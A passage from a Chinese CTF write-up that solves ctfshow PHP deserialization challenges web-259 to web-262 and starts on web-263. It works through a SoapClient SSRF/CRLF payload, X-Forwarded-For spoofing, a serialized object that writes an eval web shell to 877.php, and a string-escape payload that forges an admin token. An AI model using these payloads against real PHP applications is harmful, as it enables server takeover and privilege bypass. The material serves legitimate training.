class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$ua</span> = <span class="hljs-string">&quot;Firefox\r\nContent-Type:application/x-www-form-urlencoded\r\nX-Forwarded-For:127.0.0.1,127.0.0.1\r\nContent-Length:13\r\n\r\ntoken=ctfshow&quot;</span>;<br><span class="hljs-variable">$client</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>, <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<br>    <span class="hljs-string">&#x27;location&#x27;</span> =&gt; <span class="hljs-string">&#x27;http://127.0.0.1/flag.php&#x27;</span>,<br>    <span class="hljs-string">&#x27;user_agent&#x27;</span> =&gt; <span class="hljs-variable">$ua</span><br>));<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$client</span>));<br></code></pre></td></tr></table></figure><p>传完之后有报错，不用管</p><p>然后访问flag.txt</p><p><img src="/../image/ctfshow-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-5.png"></p><hr><h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs perl">flag.php<br><br><span class="hljs-variable">$xff</span> = explode(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);<br>array_pop(<span class="hljs-variable">$xff</span>);<br><span class="hljs-variable">$ip</span> = array_pop(<span class="hljs-variable">$xff</span>);<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ip</span>!==<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>)&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$token</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;token&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$token</span>==<span class="hljs-string">&#x27;ctfshow&#x27;</span>)&#123;<br>file_put_contents(<span class="hljs-string">&#x27;flag.txt&#x27;</span>,<span class="hljs-variable">$flag</span>);<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>因为这里只要绕过flag.php里的这些过滤就能让服务器放出flag.txt</p><p>所以分析flag.php代码 $xff &#x3D; explode(‘,’, $_SERVER[‘HTTP_X_FORWARDED_FOR’]); &#x2F;&#x2F;从 HTTP 头中 HTTP_X_FORWARDED_FOR 中获取 IP 地址列表，并使用逗号分割成一个数组。</p><p>array_pop($xff); &#x2F;&#x2F;函数删除数组中的最后一个元素并返回其值。 $ip &#x3D; array_pop($xff); &#x2F;&#x2F;从 IP 地址列表数组中弹出最后一个元素，并将其存储在 $ip 变量中。</p><p>补充 在HTTP协议报文中X-Forwarded-For 用于标识通过代理服务器连接到 web 服务器的客户端的原始 IP 地址的标头。(可以是多个地址) 格式 X-Forwarded-For: , ,</p><p>所以要跳过die 只需要在hackbar中添加 X_FORWARDED_FOR  value为127.0.0.1,127.0.0.1并且post传参token&#x3D;ctfshow</p><p><img src="/../image/../image/ctfshow-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-6.png"></p><p>然后访问flag.txt即可</p><hr><h2 id="web-260"><a href="#web-260" class="headerlink" title="web-260"></a>web-260</h2><p>首先看题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ctfshow_i_love_36D/&#x27;</span>,<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ctfshow&#x27;</span>])))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这题思路很简单，传入的ctfshow中序列化出来需要有ctfshow_i_love_36D即可</p><p>所以构造</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshow</span></span>&#123;<br>public <span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;ctfshow_i_love_36D&#x27;</span>;<br>&#125;<br>echo serialize(new ctfshow());<br></code></pre></td></tr></table></figure><p>payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">ctfshow</span>=O:7:&quot;ctfshow&quot;:1:&#123;s:1:<span class="hljs-string">&quot;a&quot;</span>;s:18:<span class="hljs-string">&quot;ctfshow_i_love_36D&quot;</span>;&#125;<br>或者直接传入<br>?<span class="hljs-attribute">ctfshow</span>=ctfshow_i_love_36D<br></code></pre></td></tr></table></figure><hr><h2 id="web-261-unserialize、-wakeup、-destruct"><a href="#web-261-unserialize、-wakeup、-destruct" class="headerlink" title="web-261 __unserialize、__wakeup、__destruct"></a>web-261 __unserialize、__wakeup、__destruct</h2><p>先看题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshowvip</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username=<span class="hljs-variable">$u</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password=<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;username!=<span class="hljs-string">&#x27;&#x27;</span> || <span class="hljs-variable language_">$this</span>-&gt;password!=<span class="hljs-string">&#x27;&#x27;</span>)&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;code);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username=<span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password=<span class="hljs-string">&#x27;&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unserialize</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username=<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>        <span class="hljs-variable language_">$this</span>-&gt;password=<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>        <span class="hljs-variable language_">$this</span>-&gt;code = <span class="hljs-variable language_">$this</span>-&gt;username.<span class="hljs-variable language_">$this</span>-&gt;password;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;code==<span class="hljs-number">0x36d</span>)&#123;<br>            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;username, <span class="hljs-variable">$this</span>-&gt;password);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;vip&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>这道题使用了__unserialize()和__wakeup()两个魔术方法</p><p>注意：如果类中同时定义了__unserialize()和__wakeup()两个魔术方法，则只有__unserialize()方法会生效，__wakeup()方法会被忽略。</p><p>当反序列化时会触发__unserialize()魔术方法，而且这里没有办法可以触发__invoke()，因为invoke只有对象被当做函数调用才会被触发。所以这里就不能用invoke中的eval来进行命令执行拿到flag。但是可以触发destruct然后使用其中的file_put_contents写入webshell</p><p>这里只需要满足code&#x3D;0x36d（877）即可。而code又是由username和password拼接而成，所以只要username&#x3D;877.php，password&#x3D;<code>&lt;?php eval($_POST[1]);?&gt;</code>，877.php&#x3D;0x36d（877）是成立的（弱类型比较。利用__construct函数把username和password写进去。直接在类中赋值也可以，一样的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshowvip</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username=<span class="hljs-variable">$u</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password=<span class="hljs-variable">$p</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfshowvip</span>(<span class="hljs-string">&#x27;877.php&#x27;</span>,<span class="hljs-string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>O:10:”ctfshowvip”:2:{s:8:”username”;s:7:”877.php”;s:8:”password”;s:24:”<?php eval($_POST[1]);?>“;}</p><p>payload：</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?vip=O:10:&quot;ctfshowvip&quot;:2:&#123;s:8:&quot;username&quot;;s:7:&quot;877.php&quot;;s:8:&quot;password&quot;;s:24:&quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>测试一下</p><p>访问877.php然后post传入1&#x3D;phpinfo();</p><p>成功执行</p><p><img src="/../image/ctfshow-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-7.png"></p><hr><h2 id="web-262-字符串增多逃逸"><a href="#web-262-字符串增多逃逸" class="headerlink" title="web-262 字符串增多逃逸"></a>web-262 字符串增多逃逸</h2><p>首先先看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-12-03 02:37:19</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-12-03 16:05:38</span><br><span class="hljs-comment"># <span class="hljs-doctag">@message</span>.php</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">message</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$from</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$msg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$to</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;user&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">from</span> = <span class="hljs-variable">$f</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;msg = <span class="hljs-variable">$m</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;to = <span class="hljs-variable">$t</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$f</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br><span class="hljs-variable">$m</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;m&#x27;</span>];<br><span class="hljs-variable">$t</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;t&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$f</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$m</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$t</span>))&#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">message</span>(<span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span>);<br>    <span class="hljs-variable">$umsg</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;fuck&#x27;</span>, <span class="hljs-string">&#x27;loveU&#x27;</span>, <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$msg</span>));<br>    <span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&#x27;msg&#x27;</span>,<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$umsg</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your message has been sent&#x27;</span>;<br>&#125;<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure><p>没发现跟flag有关的东西，</p><p>但是看到前面有个message.php，访问一下它</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-12-03 15:13:03</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-12-03 15:17:17</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">message</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$from</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$msg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$to</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;user&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">from</span> = <span class="hljs-variable">$f</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;msg = <span class="hljs-variable">$m</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;to = <span class="hljs-variable">$t</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]));<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$msg</span>-&gt;token==<span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到输出 flag 的条件是 <strong>$msg-&gt;token&#x3D;&#x3D;’admin’</strong> ，也就是说，我们要将 token 进行修改</p><p>先构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">message</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$from</span>=<span class="hljs-string">&#x27;d&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$msg</span>=<span class="hljs-string">&#x27;m&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$to</span>=<span class="hljs-string">&#x27;1&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;user&#x27;</span>;<br>    &#125;<br><span class="hljs-variable">$msg</span>= <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> message);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$msg</span>;<br></code></pre></td></tr></table></figure><p>结果：O:7:”message”:4:{s:4:”from”;s:1:”d”;s:3:”msg”;s:1:”m”;s:2:”to”;s:1:”1”;s:5:”token”;s:4:”user”;}</p><p>我们可以利用$to这个变量，利用PHP反序列化的特点，将后面的s:5:”token”;s:4:”user”分隔开，然后将s:5:”token”:s:5:”admin”;放进去，所以我们进行构造，注意闭合</p><p>&#x2F;&#x2F;<code>&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code> 这一共<strong>27</strong>个字符长度就是我们需要插入的字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">message</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$from</span>=<span class="hljs-string">&#x27;d&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$msg</span>=<span class="hljs-string">&#x27;m&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$to</span>=<span class="hljs-string">&#x27;1&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;user&#x27;</span>;<br>    &#125;<br><span class="hljs-variable">$msg</span>= <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> message);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$msg</span>;<br></code></pre></td></tr></table></figure><p>结果：O:7:”message”:4:{s:4:”from”;s:1:”d”;s:3:”msg”;s:1:”m”;s:2:”to”;s:28:”1”;s:5:”token”;s:5:”admin”;}”;s:5:”token”;s:4:”user”;}</p><p>但是这里不能直接用，因为长度出错了s:28:”1”;s:5:”token”;s:5:”admin”;}”</p><p><strong>如果为28则会匹配后面28个字符，这样闭合就没有效果。</strong></p><p>这时候我们就可以用前面的<code>str_replace(&#39;fuck&#39;, &#39;loveU&#39;, serialize($msg));</code>语句</p><p>利用<code>loveU</code>替换<code>fuck</code>补充这27的差值，一个fuck比一个loveU多一个长度，27个fuck就会多出27个长度</p><p>后面多出27个字符，所以我们写27个fuck，替换为loveU后，增加了27个字符，来达到字符串逃逸</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">message</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$from</span>=<span class="hljs-string">&#x27;d&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$msg</span>=<span class="hljs-string">&#x27;m&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$to</span>=<span class="hljs-string">&#x27;1fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;user&#x27;</span>;<br>    &#125;<br><span class="hljs-variable">$msg</span>= <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> message);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$msg</span>;<br></code></pre></td></tr></table></figure><p>最后构造payload：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts">?f=<span class="hljs-number">1</span><span class="hljs-variable">&amp;m</span>=<span class="hljs-number">2</span><span class="hljs-variable">&amp;t</span>=<span class="hljs-number">1f</span>uckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck<span class="hljs-string">&quot;;s:5:&quot;</span>token<span class="hljs-string">&quot;;s:5:&quot;</span>admin<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>然后访问再访问message.php即可</p><p><img src="/../image/ctfshow-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-8.png"></p><hr><h2 id="web-263-session反序列化漏洞"><a href="#web-263-session反序列化漏洞" class="headerlink" title="web-263 session反序列化漏洞"></a>web-263 session反序列化漏洞</h2><p>本题考查session反序列话漏洞<br>相关讲解<a href="https://www.jb51.net/article/116246.htm">https://www.jb51.net/article/116246.htm</a></p><p>我们登录进去只有一个登录页面和check.php</p><p>用dirsearch扫一下，发现<a href="http://www.zip文件,访问下载下来是网站源码./">www.zip文件，访问下载下来是网站源码。</a></p><p>index.php</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 